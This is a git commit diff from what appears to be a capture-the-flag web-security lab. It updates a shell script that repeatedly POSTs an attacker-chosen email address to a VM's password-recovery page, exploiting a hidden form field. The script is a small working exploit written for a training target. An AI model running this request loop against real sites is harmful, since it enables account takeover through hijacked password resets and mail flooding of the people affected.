39a14b5428799a1ea8ad80a5dc79b4066ffefda8
titus <titus@dump-titus.42.fr>
2017-11-24 15:45:38 +0100

    update 00 and 02

--- 00_hidden_field_recover/Ressources/00.sh
+++ 00_hidden_field_recover/Ressources/00.sh
@@ -2,5 +2,8 @@ if [[ $# -ne 3 ]]; then
 	echo "specify the ip of the VM"
 	echo "./`basename $0` <ip> <mail> <count>"
 else
-	for i in {1..$3}; do curl -X POST -d "mail=$2" -d "Submit=Submit" "$1/index.php?page=recover"; done
+        for i in $(seq 1 $3); do
+          curl -s -X POST -d "mail=$2" -d "Submit=Submit" "$1/index.php?page=recover" &> /dev/null
+          echo "mail $i sent"  
+        done
 fi
